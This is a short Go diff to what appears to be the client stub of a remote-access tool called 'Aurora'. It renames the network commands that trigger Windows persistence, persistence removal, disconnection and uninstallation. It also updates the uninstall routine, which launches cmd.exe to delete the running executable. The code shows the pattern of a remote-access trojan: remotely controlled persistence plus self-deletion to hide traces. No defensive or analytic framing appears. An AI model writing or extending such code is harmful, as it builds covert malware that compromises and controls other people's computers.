@@ -84,14 +84,14 @@ func (stub *Stub) handlePackets() {
 				}
 			case "MSG":
 				fmt.Println("Aurora: incoming message \"" + packet.StringData + "\"")
-			case "P":
+			case "PERSIST":
 				addPersistence()
-			case "RP":
+			case "RMPERSIST":
 				removePersistence()
 			case "DC":
 				stub.conn = nil
 				return
-			case "UNINSTALL":
+			case "REMOVE":
 				uninstall()
 			}
 		}
@@ -121,7 +121,7 @@ func uninstall() {
 
 	var sI syscall.StartupInfo
 	var pI syscall.ProcessInformation
-	argv := syscall.StringToUTF16Ptr(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
+	argv, _ := syscall.UTF16PtrFromString(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
 	syscall.CreateProcess(
 		nil,
 		argv,
